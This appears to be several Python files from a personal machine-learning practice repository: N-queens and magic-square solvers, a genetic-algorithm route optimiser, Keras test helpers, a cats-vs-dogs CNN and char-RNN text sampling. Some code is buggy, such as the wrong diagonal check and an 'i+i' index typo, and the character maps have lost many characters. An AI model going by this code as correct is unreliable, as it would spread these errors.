from constraint import Problem, Domain, AllDifferentConstraint
import matplotlib.pyplot as plt
import numpy as np


def _get_pairs(variables):
        work = list(variables)
        pairs = [ (work[i], work[i+1]) for i in range(len(work)-1) ]
        return pairs

def n_queens(n=8):

    def not_in_diagonal(a, b):
        result = True
        for i in range(1, n):
            result = result and ( a != b + i )
        return result

    problem = Problem()
    variables = { f'x{i}' for i in range(n) }
    problem.addVariables(variables, Domain(set(range(1, n+1))))
    problem.addConstraint(AllDifferentConstraint())
    for pair in _get_pairs(variables):
        problem.addConstraint(not_in_diagonal, pair)
    return problem.getSolutions()


def magic_square(n=3):

    def all_equal(*variables):
        square = np.reshape(variables, (n, n))
        diagonal = sum(np.diagonal(square))
        b = True
        for i in range(n):
            b = b and sum(square[i, :]) == diagonal 
            b = b and sum(square[:, i]) == diagonal
        if b:
            print(square)
        return b

    problem = Problem()
    variables = { f'x{i}{j}' for i in range(1, n+1) for j in range(1, n+1) }
    problem.addVariables(variables, Domain(set(range(1, (n**2 + 2)))))
    problem.addConstraint(all_equal, variables)
    problem.addConstraint(AllDifferentConstraint())
    return problem.getSolutions()



def plot_queens(solutions):
    for solution in solutions:
        for row, column in solution.items():
            x = int(row.lstrip('x'))
            y = column
            plt.scatter(x, y, s=70)
        plt.grid()
        plt.show()

if __name__ == "__main__":
    # solutions = n_queens(n=12)
    # print(solutions)
    # plot_queens(solutions)

    solutions = magic_square(n=4)
    for solution in solutions:
        print(solution)




import numpy as np
import random
import operator
import pandas as pd
import matplotlib.pyplot as plt
import seaborn
from matplotlib import animation
from realtime_plot import realtime_plot
from threading import Thread, Event
from time import sleep

seaborn.set_style("dark")

stop_animation = Event()

# def animate_cities_and_routes():
#     global route

#     def wrapped():
#         # create figure
#         sleep(3)
#         print("thread:", route)
#         figure = plt.figure(figsize=(14, 8))
#         ax1 = figure.add_subplot(1, 1, 1)

#         def animate(i):
#             ax1.title.set_text("Real time routes")
#             for city in route:
#                 ax1.scatter(city.x, city.y, s=70, c='b')

#             ax1.plot([ city.x for city in route ], [city.y for city in route], c='r')
            
#         animation.FuncAnimation(figure, animate, interval=100)
#         plt.show()
#     t = Thread(target=wrapped)
#     t.start()

def plot_routes(initial_route, final_route):
    _, ax = plt.subplots(nrows=1, ncols=2)

    for col, route in zip(ax, [("Initial Route", initial_route), ("Final Route", final_route) ]):
        col.title.set_text(route[0])
        route = route[1]
        for city in route:
            col.scatter(city.x, city.y, s=70, c='b')

        col.plot([ city.x for city in route ], [city.y for city in route], c='r')
        col.plot([route[-1].x, route[0].x], [route[-1].x, route[-1].y])
    
    plt.show()

def animate_progress():
    global route
    global progress
    global stop_animation

    def animate():
        # figure = plt.figure()
        # ax1 = figure.add_subplot(1, 1, 1)
        figure, ax1 = plt.subplots(nrows=1, ncols=2)
        while True:

            ax1[0].clear()
            ax1[1].clear()

            # current routes and cities
            ax1[0].title.set_text("Current routes")
            

            for city in route:
                ax1[0].scatter(city.x, city.y, s=70, c='b')

            ax1[0].plot([ city.x for city in route ], [city.y for city in route], c='r')
            ax1[0].plot([route[-1].x, route[0].x], [route[-1].y, route[0].y], c='r')

            # current distance graph
            ax1[1].title.set_text("Current distance")
            ax1[1].plot(progress)
            ax1[1].set_ylabel("Distance")
            ax1[1].set_xlabel("Generation")

            plt.pause(0.05)


            if stop_animation.is_set():
                break
        plt.show()

    Thread(target=animate).start()


class City:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def distance(self, city):
        """Returns distance between self city and city"""
        x = abs(self.x - city.x)
        y = abs(self.y - city.y)
        return np.sqrt(x ** 2 + y ** 2)

    def __sub__(self, city):
        return self.distance(city)

    def __repr__(self):
        return f"({self.x}, {self.y})"

    def __str__(self):
        return self.__repr__()


class Fitness:
    def __init__(self, route):
        self.route = route

    def distance(self):
        distance = 0
        for i in range(len(self.route)):
            from_city = self.route[i]
            to_city = self.route[i+1] if i+i < len(self.route) else self.route[0]
            distance += (from_city - to_city)
        return distance

    def fitness(self):
        return 1 / self.distance()


def generate_cities(size):
    cities = []
    for i in range(size):
        x = random.randint(0, 200)
        y = random.randint(0, 200)

        if 40 < x < 160:
            if 0.5 <= random.random():
                y = random.randint(0, 40)
            else:
                y = random.randint(160, 200)
        elif 40 < y < 160:
            if 0.5 <= random.random():
                x = random.randint(0, 40)
            else:
                x = random.randint(160, 200)

        cities.append(City(x, y))
    return cities
    # return [ City(x=random.randint(0, 200), y=random.randint(0, 200)) for i in range(size) ]


def create_route(cities):
    return random.sample(cities, len(cities))


def initial_population(popsize, cities):
    return [ create_route(cities) for i in range(popsize) ]


def sort_routes(population):
    """This function calculates the fitness of each route in population
    And returns a population sorted by its fitness in descending order"""

    result = [ (i, Fitness(route).fitness()) for i, route in enumerate(population) ]
    return sorted(result, key=operator.itemgetter(1), reverse=True)


def selection(population, elite_size):
    sorted_pop = sort_routes(population)
    df = pd.DataFrame(np.array(sorted_pop), columns=["Index", "Fitness"])
    # calculates the cumulative sum
    # example:
    # [5, 6, 7] => [5, 11, 18]
    df['cum_sum']  = df['Fitness'].cumsum()
    # calculates the cumulative percentage
    # example:
    # [5, 6, 7] => [5/18, 11/18, 18/18]
    # [5, 6, 7] => [27.77%, 61.11%, 100%]
    df['cum_perc'] = 100 * df['cum_sum'] / df['Fitness'].sum()

    result = [ sorted_pop[i][0] for i in range(elite_size) ]

    for i in range(len(sorted_pop) - elite_size):
        pick = random.random() * 100
        for i in range(len(sorted_pop)):
            if pick <= df['cum_perc'][i]:
                result.append(sorted_pop[i][0])
                break
    return [ population[index] for index in result ]


def breed(parent1, parent2):
    child1, child2 = [], []

    gene_A = random.randint(0, len(parent1))
    gene_B = random.randint(0, len(parent2))

    start_gene = min(gene_A, gene_B)
    end_gene   = max(gene_A, gene_B)

    for i in range(start_gene, end_gene):
        child1.append(parent1[i])
    
    child2 = [ item for item in parent2 if item not in child1 ]
    return child1 + child2


def breed_population(selection, elite_size):
    pool = random.sample(selection, len(selection))

    # for i in range(elite_size):
    #     children.append(selection[i])
    children = [selection[i] for i in range(elite_size)]
    children.extend([breed(pool[i], pool[len(selection)-i-1]) for i in range(len(selection) - elite_size)])

    # for i in range(len(selection) - elite_size):
    #     child = breed(pool[i], pool[len(selection)-i-1])
    #     children.append(child)

    return children


def mutate(route, mutation_rate):
    route_length = len(route)
    for swapped in range(route_length):
        if(random.random() < mutation_rate):
            swap_with = random.randint(0, route_length-1)
            route[swapped], route[swap_with] = route[swap_with], route[swapped]
    return route


def mutate_population(population, mutation_rate):
    return [ mutate(route, mutation_rate) for route in population ]


def next_gen(current_gen, elite_size, mutation_rate):
    select = selection(population=current_gen, elite_size=elite_size)
    children = breed_population(selection=select, elite_size=elite_size)
    return mutate_population(children, mutation_rate)


def genetic_algorithm(cities, popsize, elite_size, mutation_rate, generations, plot=True, prn=True):
    global route
    global progress

    population = initial_population(popsize=popsize, cities=cities)
    if plot:
        animate_progress()
    sorted_pop = sort_routes(population)
    initial_route = population[sorted_pop[0][0]]
    distance = 1 / sorted_pop[0][1]
    if prn:
        print(f"Initial distance: {distance}")
    try:
        if plot:
            progress = [ distance ]
            for i in range(generations):
                population = next_gen(population, elite_size, mutation_rate)
                sorted_pop = sort_routes(population)
                distance = 1 / sorted_pop[0][1]
                
                progress.append(distance)
                if prn:
                    print(f"[Generation:{i}] Current distance: {distance}")
                route = population[sorted_pop[0][0]]
        else:
            for i in range(generations):
                population = next_gen(population, elite_size, mutation_rate)
                distance = 1 / sort_routes(population)[0][1]
                
                if prn:
                    print(f"[Generation:{i}] Current distance: {distance}")
    except KeyboardInterrupt:
        pass
    stop_animation.set()
    final_route_index = sort_routes(population)[0][0]
    final_route = population[final_route_index]
    if prn:
        print("Final route:", final_route)
    
    return initial_route, final_route, distance


if __name__ == "__main__":
    cities = generate_cities(25)
    initial_route, final_route, distance = genetic_algorithm(cities=cities, popsize=120, elite_size=19, mutation_rate=0.0019, generations=1800)
    # plot_routes(initial_route, final_route)




import numpy
import matplotlib.pyplot as plt
import cv2
from PIL import Image
from multiprocessing import Process


def fig2img ( fig ):
    """
    brief Convert a Matplotlib figure to a PIL Image in RGBA format and return it
    param fig a matplotlib figure
    return a Python Imaging Library ( PIL ) image
    """
    # put the figure pixmap into a numpy array
    buf = fig2data ( fig )
    w, h, d = buf.shape
    return Image.frombytes( "RGB", ( w ,h ), buf.tostring( ) )


def fig2data ( fig ):
    """
    brief Convert a Matplotlib figure to a 4D numpy array with RGBA channels and return it
    param fig a matplotlib figure
    return a numpy 3D array of RGBA values
    """
    # draw the renderer
    fig.canvas.draw ( )
 
    # Get the RGBA buffer from the figure
    w,h = fig.canvas.get_width_height()
    buf = numpy.fromstring ( fig.canvas.tostring_rgb(), dtype=numpy.uint8 )
    buf.shape = ( w, h,3 )
 
    # canvas.tostring_argb give pixmap in ARGB mode. Roll the ALPHA channel to have it in RGBA mode
    buf = numpy.roll ( buf, 3, axis = 2 )
    return buf


if __name__ == "__main__":
    pass
    # figure = plt.figure()
    # plt.plot([3, 5, 9], [3, 19, 23])
    # img = fig2img(figure)
    # img.show()
    # while True:
    #     frame = numpy.array(img)
    #     # Convert RGB to BGR 
    #     frame = frame[:, :, ::-1].copy() 
    #     print(frame)
    #     cv2.imshow("test", frame)
    #     if cv2.waitKey(0) == ord('q'):
    #         break
    # cv2.destroyAllWindows()



def realtime_plot(route):

    
    figure = plt.figure(figsize=(14, 8))
    plt.title("Real time routes")
    for city in route:
        plt.scatter(city.x, city.y, s=70, c='b')

    plt.plot([ city.x for city in route ], [city.y for city in route], c='r')
    
    img = numpy.array(fig2img(figure))
    cv2.imshow("test", img)
    if cv2.waitKey(1) == ord('q'):
        cv2.destroyAllWindows()
    plt.close(figure)




from genetic import genetic_algorithm, generate_cities, City
import operator

def load_cities():
    return [ City(city[0], city[1]) for city in [(169, 20), (103, 24), (41, 9), (177, 76), (138, 173), (163, 108), (93, 34), (200, 84), (19, 184), (117, 176), (153, 30), (140, 29), (38, 108), (89, 183), (18, 4), (174, 38), (109, 169), (93, 23), (156, 10), (171, 27), (164, 91), (109, 194), (90, 169), (115, 37), (177, 93), (169, 20)] ]

def train():
    cities = load_cities()
    generations = 1000
    popsizes = [60, 100, 140, 180]
    elitesizes = [5, 15, 25, 35, 45]
    mutation_rates = [0.0001, 0.0005, 0.001, 0.005, 0.01]

    total_iterations = len(popsizes) * len(elitesizes) * len(mutation_rates)
    iteration = 0

    tries = {}

    for popsize in popsizes:
        for elite_size in elitesizes:
            for mutation_rate in mutation_rates:
                iteration += 1
                init_route, final_route, distance = genetic_algorithm( cities=cities,
                                         popsize=popsize,
                                         elite_size=elite_size,
                                         mutation_rate=mutation_rate,
                                         generations=generations,
                                         plot=False,
                                         prn=False)
                progress = iteration / total_iterations
                percentage = progress * 100
                print(f"[{percentage:5.2f}%] [Iteration:{iteration:3}/{total_iterations:3}] [popsize={popsize:3} elite_size={elite_size:2} mutation_rate={mutation_rate:7}] Distance: {distance:4}")
                tries[(popsize, elite_size, mutation_rate)] = distance
    
    min_gen = min(tries.values())
    reversed_tries = { v:k for k, v in tries.items() }
    best_combination = reversed_tries[min_gen]
    print("Best combination:", best_combination)


if __name__ == "__main__":
    train()

    
# best parameters
# popsize	elitesize	mutation_rateqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
# 90	    25		    0.0001
# 110	    10		    0.001
# 130	    10		    0.005
# 130	    20		    0.001
# 150	    25		    0.001




import os


def load_data(path):
    """
    Load dataset
    """
    input_file = os.path.join(path)
    with open(input_file, "r") as f:
        data = f.read()

    return data.split('\n')




import numpy as np
from keras.losses import sparse_categorical_crossentropy
from keras.models import Sequential
from keras.preprocessing.text import Tokenizer
from keras.utils import to_categorical


def _test_model(model, input_shape, output_sequence_length, french_vocab_size):
    if isinstance(model, Sequential):
        model = model.model

    assert model.input_shape == (None, *input_shape[1:]),\
        'Wrong input shape. Found input shape {} using parameter input_shape={}'.format(model.input_shape, input_shape)

    assert model.output_shape == (None, output_sequence_length, french_vocab_size),\
        'Wrong output shape. Found output shape {} using parameters output_sequence_length={} and french_vocab_size={}'\
            .format(model.output_shape, output_sequence_length, french_vocab_size)

    assert len(model.loss_functions) > 0,\
        'No loss function set.  Apply the compile function to the model.'

    assert sparse_categorical_crossentropy in model.loss_functions,\
        'Not using sparse_categorical_crossentropy function for loss.'


def test_tokenize(tokenize):
    sentences = [
        'The quick brown fox jumps over the lazy dog .',
        'By Jove , my quick study of lexicography won a prize .',
        'This is a short sentence .']
    tokenized_sentences, tokenizer = tokenize(sentences)
    assert tokenized_sentences == tokenizer.texts_to_sequences(sentences),\
        'Tokenizer returned and doesn\'t generate the same sentences as the tokenized sentences returned. '


def test_pad(pad):
    tokens = [
        [i for i in range(4)],
        [i for i in range(6)],
        [i for i in range(3)]]
    padded_tokens = pad(tokens)
    padding_id = padded_tokens[0][-1]
    true_padded_tokens = np.array([
        [i for i in range(4)] + [padding_id]*2,
        [i for i in range(6)],
        [i for i in range(3)] + [padding_id]*3])
    assert isinstance(padded_tokens, np.ndarray),\
        'Pad returned the wrong type.  Found {} type, expected numpy array type.'
    assert np.all(padded_tokens == true_padded_tokens), 'Pad returned the wrong results.'

    padded_tokens_using_length = pad(tokens, 9)
    assert np.all(padded_tokens_using_length == np.concatenate((true_padded_tokens, np.full((3, 3), padding_id)), axis=1)),\
        'Using length argument return incorrect results'


def test_simple_model(simple_model):
    input_shape = (137861, 21, 1)
    output_sequence_length = 21
    english_vocab_size = 199
    french_vocab_size = 344

    model = simple_model(input_shape, output_sequence_length, english_vocab_size, french_vocab_size)
    _test_model(model, input_shape, output_sequence_length, french_vocab_size)


def test_embed_model(embed_model):
    input_shape = (137861, 21)
    output_sequence_length = 21
    english_vocab_size = 199
    french_vocab_size = 344

    model = embed_model(input_shape, output_sequence_length, english_vocab_size, french_vocab_size)
    _test_model(model, input_shape, output_sequence_length, french_vocab_size)


def test_encdec_model(encdec_model):
    input_shape = (137861, 15, 1)
    output_sequence_length = 21
    english_vocab_size = 199
    french_vocab_size = 344

    model = encdec_model(input_shape, output_sequence_length, english_vocab_size, french_vocab_size)
    _test_model(model, input_shape, output_sequence_length, french_vocab_size)


def test_bd_model(bd_model):
    input_shape = (137861, 21, 1)
    output_sequence_length = 21
    english_vocab_size = 199
    french_vocab_size = 344

    model = bd_model(input_shape, output_sequence_length, english_vocab_size, french_vocab_size)
    _test_model(model, input_shape, output_sequence_length, french_vocab_size)


def test_model_final(model_final):
    input_shape = (137861, 15)
    output_sequence_length = 21
    english_vocab_size = 199
    french_vocab_size = 344

    model = model_final(input_shape, output_sequence_length, english_vocab_size, french_vocab_size)
    _test_model(model, input_shape, output_sequence_length, french_vocab_size)




CATEGORIES = ["Dog", "Cat"]
IMG_SIZE = 100


DATADIR = r"C:\Users\STRIX\Desktop\CatnDog\PetImages"
TRAINING_DIR = r"E:\datasets\CatnDog\Training"
TESTING_DIR  = r"E:\datasets\CatnDog\Testing"




import cv2
import tensorflow as tf
import os
import numpy as np
import random
from settings import *
from tqdm import tqdm


# CAT_PATH = r"C:\Users\STRIX\Desktop\CatnDog\Testing\Cat"
# DOG_PATH = r"C:\Users\STRIX\Desktop\CatnDog\Testing\Dog"

MODEL = "Cats-vs-dogs-new-6-0.90-CNN"

def prepare_image(path):
    image = cv2.imread(path, cv2.IMREAD_GRAYSCALE)
    image = cv2.resize(image, (IMG_SIZE, IMG_SIZE))
    return image
    # img = cv2.imread(path, cv2.IMREAD_GRAYSCALE)
    # img = cv2.resize(img, (IMG_SIZE, IMG_SIZE))
    # return img.reshape(-1, IMG_SIZE, IMG_SIZE, 1)


def load_model():
    return tf.keras.models.load_model(f"{MODEL}.model")


def predict(img):
    prediction = model.predict([prepare_image(img)])[0][0]
    return int(prediction)


if __name__ == "__main__":
    model = load_model()
    x_test, y_test = [], []

    for code, category in enumerate(CATEGORIES):    
        path = os.path.join(TESTING_DIR, category)
        for img in tqdm(os.listdir(path), "Loading images:"):
            # result = predict(os.path.join(path, img))
            # if result == code:
            #     correct += 1
            # total += 1
            # testing_data.append((os.path.join(path, img), code))
            x_test.append(prepare_image(os.path.join(path, img)))
            y_test.append(code)

    x_test = np.array(x_test).reshape(-1, IMG_SIZE, IMG_SIZE, 1)

    # random.shuffle(testing_data)

    # total = 0
    # correct = 0

    # for img, code in testing_data:
        
    #     result = predict(img)
    #     if result == code:
    #         correct += 1
    #     total += 1

    # accuracy = (correct/total) * 100
    # print(f"{correct}/{total}   Total Accuracy: {accuracy:.2f}%")
    # print(x_test)
    # print("="*50)
    # print(y_test)
    print(model.evaluate([x_test], y_test))
    print(model.metrics_names)




import numpy as np
import matplotlib.pyplot as plt
import cv2
import os
# import cv2
from tqdm import tqdm
import random
from settings import *


# for the first time only
# for category in CATEGORIES: 
#     directory = os.path.join(TRAINING_DIR, category)
#     os.makedirs(directory)

# # for the first time only
# for category in CATEGORIES: 
#     directory = os.path.join(TESTING_DIR, category)
#     os.makedirs(directory)




# Total images for each category: 12501 image (total 25002)


# def create_data():
#     for code, category in enumerate(CATEGORIES):
#         path = os.path.join(DATADIR, category)
#         for counter, img in enumerate(tqdm(os.listdir(path)), start=1):
#             try:
#                 # absolute path of image
#                 image = os.path.join(path, img)
#                 image = cv2.imread(image, cv2.IMREAD_GRAYSCALE)
#                 image = cv2.resize(image, (IMG_SIZE, IMG_SIZE))
#                 if counter < 300:
#                     # testing image
#                     img = os.path.join(TESTING_DIR, category, img)
#                 else:
#                     # training image
#                     img = os.path.join(TRAINING_DIR, category, img)

#                 cv2.imwrite(img, image)
#             except:
#                 pass


def load_data(path):

    data = []

    for code, category in enumerate(CATEGORIES):
        p = os.path.join(path, category)
        for img in tqdm(os.listdir(p), desc=f"Loading {category} data: "):
            img = os.path.join(p, img)
            img = cv2.imread(img, cv2.IMREAD_GRAYSCALE)
            data.append((img, code))

    return data


def load_training_data():
    return load_data(TRAINING_DIR)


def load_testing_data():
    return load_data(TESTING_DIR)



# # load data
# training_data = load_training_data()
# # # shuffle data
# random.shuffle(training_data)

# X, y = [], []


# for features, label in tqdm(training_data, desc="Splitting the data: "):
#     X.append(features)
#     y.append(label)

# X = np.array(X).reshape(-1, IMG_SIZE, IMG_SIZE, 1)

# # pickling (images,labels)
# print("Pickling data...")
import pickle

# with open("X.pickle", 'wb') as pickle_out:
#     pickle.dump(X, pickle_out)

# with open("y.pickle", 'wb') as pickle_out:
#     pickle.dump(y, pickle_out)



def load():
    return np.array(pickle.load(open("X.pickle", 'rb'))), pickle.load(open("y.pickle", 'rb'))

print("Loading data...")
X, y = load()

X = X/255 # to make colors from 0 to 1
print("Shape of X:", X.shape)
import tensorflow
from tensorflow.keras.datasets import cifar10
from tensorflow.keras.preprocessing.image import ImageDataGenerator
from tensorflow.keras.callbacks import ModelCheckpoint
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, Dropout, Activation, Flatten
from tensorflow.keras.layers import Conv2D, MaxPooling2D
# from tensorflow.keras.callbacks import TensorBoard

print("Imported tensorflow, building model...")

NAME = "Cats-vs-dogs-new-9-{val_acc:.2f}-CNN"

checkpoint = ModelCheckpoint(filepath=f"{NAME}.model", save_best_only=True, verbose=1)

# 3 conv, 64 nodes per layer, 0 dense

model = Sequential()

model.add(Conv2D(32, (2, 2), input_shape=X.shape[1:]))
model.add(Activation('relu'))
model.add(Conv2D(32, (2, 2)))
model.add(Dropout(0.1))
model.add(MaxPooling2D(pool_size=(2, 2)))

model.add(Conv2D(64, (2, 2)))
model.add(Activation('relu'))
model.add(Conv2D(64, (2, 2)))
model.add(Dropout(0.1))
model.add(Activation('relu'))
model.add(MaxPooling2D(pool_size=(2, 2)))

model.add(Conv2D(96, (2, 2)))
model.add(Activation('relu'))
model.add(Conv2D(96, (2, 2)))
model.add(Dropout(0.1))
model.add(Activation('relu'))
model.add(MaxPooling2D(pool_size=(2, 2)))

model.add(Conv2D(128, (2, 2)))
model.add(Activation('relu'))
model.add(Conv2D(128, (2, 2)))
model.add(Dropout(0.1))
model.add(Activation('relu'))
model.add(MaxPooling2D(pool_size=(2, 2)))

model.add(Dense(500, activation="relu"))

model.add(Flatten())  # this converts our 3D feature maps to 1D feature vectors

model.add(Dense(1))
model.add(Activation('sigmoid'))

model.summary()

print("Compiling model ...")

# tensorboard = TensorBoard(log_dir=f"logs/{NAME}")

model.compile(loss="binary_crossentropy",
              optimizer="rmsprop",
              metrics=['accuracy'])

print("Training...")

model.fit(X, y, batch_size=64, epochs=30, validation_split=0.2, callbacks=[checkpoint])




### Hyper Parameters ###

batch_size = 256         # Sequences per batch
num_steps = 70          # Number of sequence steps per batch
lstm_size = 256          # Size of hidden layers in LSTMs
num_layers = 2           # Number of LSTM layers
learning_rate = 0.003    # Learning rate
keep_prob = 0.3          # Dropout keep probability

epochs = 20
# Print losses every N interations
print_every_n = 100

# Save every N iterations
save_every_n = 500

NUM_THREADS = 12




# to use CPU
import os
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=1,
                        inter_op_parallelism_threads=1, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )
                       
import train_chars
import numpy as np
import keyboard


char2int_target = {'\t': 0, '\n': 1, '\x0c': 2, ' ': 3, '!': 4, '"': 5, '#': 6, '': 7, '%': 8, '&': 9, "'": 10, '(': 11, ')': 12, '*': 13, '+': 14, ',': 15, '-': 16, '.': 17,
'/': 18, '0': 19, '1': 20, '2': 21, '3': 22, '4': 23, '5': 24, '6': 25, '7': 26, '8': 27, '9': 28, ':': 29, '': 30, '<': 31, '=': 32, '>': 33, '?': 34, '':
35, 'A': 36, 'B': 37, 'C': 38, 'D': 39, 'E': 40, 'F': 41, 'G': 42, 'H': 43, 'I': 44, 'J': 45, 'K': 46, 'L': 47, 'M': 48, 'N': 49, 'O': 50, 'P': 51, 'Q': 52, 'R': 53, 'S': 54, 'T': 55, 'U': 56, 'V': 57, 'W': 58, 'X': 59, 'Y': 60, 'Z': 61, '[': 62, '\\': 63, ']': 64, '^': 65, '_': 66, '': 67, 'a': 68, 'b': 69, 'c':
70, 'd': 71, 'e': 72, 'f': 73, 'g': 74, 'h': 75, 'i': 76, 'j': 77, 'k': 78, 'l': 79, 'm': 80, 'n': 81, 'o': 82, 'p': 83, 'q': 84, 'r': 85, 's': 86, 't': 87, 'u': 88, 'v': 89, 'w': 90, 'x': 91, 'y': 92, 'z': 93, '{': 94, '|': 95, '}': 96, '': 97, '': 98, '': 99, '': 100, '': 101, '': 102, '': 103, '': 104, '': 105, '\xad': 106, '': 107, '': 108, '': 109, '': 110, '': 111, '': 112, '': 113, '': 114, '': 115, '': 116, '': 117, '': 118, '': 119, '': 120, '': 121, '': 122, '': 123, '': 124, '': 125, '': 126, '': 127, '': 128, '': 129, '': 130, '': 131, '': 132, '': 133, '': 134, '': 135, '': 136, '': 137, '': 138, '': 139, '': 140, '': 141, '': 142, '': 143, '': 144, '': 145, '': 146, '': 147, '': 148, '': 149, '': 150, '': 151, '': 152, '': 153, '': 154, '': 155, '': 156, '': 157, '': 158, '': 159, '': 160, '': 161, '': 162, '': 163, '': 164, '': 165, '': 166, '': 167,
'': 168, '': 169, '': 170, '': 171, '': 172, '': 173, '': 174, '': 175, '': 176, '': 177, '': 178, '': 179, '': 180, '': 181, '': 182, '': 183, '': 184, '': 185, '': 186, '': 187, '': 188, '': 189, '': 190, '': 191, '': 192}


model = train_chars.CharRNN(len(char2int_target), lstm_size=train_chars.lstm_size, sampling=True)
saver = train_chars.tf.train.Saver()

def pick_top_n(preds, vocab_size, top_n=5):
    p = np.squeeze(preds)
    p[np.argsort(p)[:-top_n]] = 0
    p = p / np.sum(p)
    c = np.random.choice(vocab_size, 1, p=p)[0]
    return c


def write_sample(checkpoint, lstm_size, vocab_size, char2int, int2char, prime="import"):
    # samples = [c for c in prime]
    
    with train_chars.tf.Session() as sess:
        saver.restore(sess, checkpoint)
        new_state = sess.run(model.initial_state)
        for c in prime:
            x = np.zeros((1, 1))
            x[0,0] = char2int[c]
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)
        # print("Preds:", preds)
        c = pick_top_n(preds, vocab_size)
        char = int2char[c]
        keyboard.write(char)
        time.sleep(0.01)
        # samples.append(char)
        while True:
            x[0,0] = c
            feed = {model.inputs: x,
                    model.keep_prob: 1.,  
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)

            c = pick_top_n(preds, vocab_size)
            char = int2char[c]
            keyboard.write(char)
            time.sleep(0.01)
            # samples.append(char)
        
    # return ''.join(samples)ss", "as"

if __name__ == "__main__":
    # checkpoint = train_chars.tf.train_chars.latest_checkpoint("checkpoints")
    # print(checkpoint)
    checkpoint = "checkpoints/i6291_l256.ckpt"
    print()
    f = open("generates/python.txt", "a", encoding="utf8")
    int2char_target = { v:k for k, v in char2int_target.items() }
    import time
    time.sleep(2)
    write_sample(checkpoint, train_chars.lstm_size, len(char2int_target), char2int_target, int2char_target, prime="#"*100)




# to use CPU
import os
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,
                        inter_op_parallelism_threads=5, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )
                       
import train_chars
import numpy as np


char2int_target = {'\t': 0, '\n': 1, '\x0c': 2, ' ': 3, '!': 4, '"': 5, '#': 6, '': 7, '%': 8, '&': 9, "'": 10, '(': 11, ')': 12, '*': 13, '+': 14, ',': 15, '-': 16, '.': 17,
'/': 18, '0': 19, '1': 20, '2': 21, '3': 22, '4': 23, '5': 24, '6': 25, '7': 26, '8': 27, '9': 28, ':': 29, '': 30, '<': 31, '=': 32, '>': 33, '?': 34, '':
35, 'A': 36, 'B': 37, 'C': 38, 'D': 39, 'E': 40, 'F': 41, 'G': 42, 'H': 43, 'I': 44, 'J': 45, 'K': 46, 'L': 47, 'M': 48, 'N': 49, 'O': 50, 'P': 51, 'Q': 52, 'R': 53, 'S': 54, 'T': 55, 'U': 56, 'V': 57, 'W': 58, 'X': 59, 'Y': 60, 'Z': 61, '[': 62, '\\': 63, ']': 64, '^': 65, '_': 66, '': 67, 'a': 68, 'b': 69, 'c':
70, 'd': 71, 'e': 72, 'f': 73, 'g': 74, 'h': 75, 'i': 76, 'j': 77, 'k': 78, 'l': 79, 'm': 80, 'n': 81, 'o': 82, 'p': 83, 'q': 84, 'r': 85, 's': 86, 't': 87, 'u': 88, 'v': 89, 'w': 90, 'x': 91, 'y': 92, 'z': 93, '{': 94, '|': 95, '}': 96, '': 97, '': 98, '': 99, '': 100, '': 101, '': 102, '': 103, '': 104, '': 105, '\xad': 106, '': 107, '': 108, '': 109, '': 110, '': 111, '': 112, '': 113, '': 114, '': 115, '': 116, '': 117, '': 118, '': 119, '': 120, '': 121, '': 122, '': 123, '': 124, '': 125, '': 126, '': 127, '': 128, '': 129, '': 130, '': 131, '': 132, '': 133, '': 134, '': 135, '': 136, '': 137, '': 138, '': 139, '': 140, '': 141, '': 142, '': 143, '': 144, '': 145, '': 146, '': 147, '': 148, '': 149, '': 150, '': 151, '': 152, '': 153, '': 154, '': 155, '': 156, '': 157, '': 158, '': 159, '': 160, '': 161, '': 162, '': 163, '': 164, '': 165, '': 166, '': 167,
'': 168, '': 169, '': 170, '': 171, '': 172, '': 173, '': 174, '': 175, '': 176, '': 177, '': 178, '': 179, '': 180, '': 181, '': 182, '': 183, '': 184, '': 185, '': 186, '': 187, '': 188, '': 189, '': 190, '': 191, '': 192}


model = train_chars.CharRNN(len(char2int_target), lstm_size=train_chars.lstm_size, sampling=True)
saver = train_chars.tf.train.Saver()

def pick_top_n(preds, vocab_size, top_n=5):
    p = np.squeeze(preds)
    p[np.argsort(p)[:-top_n]] = 0
    p = p / np.sum(p)
    c = np.random.choice(vocab_size, 1, p=p)[0]
    return c


def sample(checkpoint, n_samples, lstm_size, vocab_size, char2int, int2char, prime="The"):
    samples = [c for c in prime]
    
    with train_chars.tf.Session() as sess:
        saver.restore(sess, checkpoint)
        new_state = sess.run(model.initial_state)
        for c in prime:
            x = np.zeros((1, 1))
            x[0,0] = char2int[c]
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)
        # print("Preds:", preds)
        c = pick_top_n(preds, vocab_size)
        samples.append(int2char[c])

        for i in range(n_samples):
            x[0,0] = c
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)

            c = pick_top_n(preds, vocab_size)
            char = int2char[c]
            samples.append(char)
        #     if i == n_samples - 1 and char != " " and char != ".":
            # if i == n_samples - 1 and char != " ":
            #     # while char != "." and char != " ":
            #     while char != " ":
            #         x[0,0] = c
            #         feed = {model.inputs: x,
            #                 model.keep_prob: 1.,
            #                 model.initial_state: new_state}
            #         preds, new_state = sess.run([model.prediction, model.final_state], 
            #                                     feed_dict=feed)

            #         c = pick_top_n(preds, vocab_size)
            #         char = int2char[c]
            #         samples.append(char)

        
    return ''.join(samples)


if __name__ == "__main__":
    # checkpoint = train_chars.tf.train_chars.latest_checkpoint("checkpoints")
    # print(checkpoint)
    checkpoint = "checkpoints/i6291_l256.ckpt"
    print()
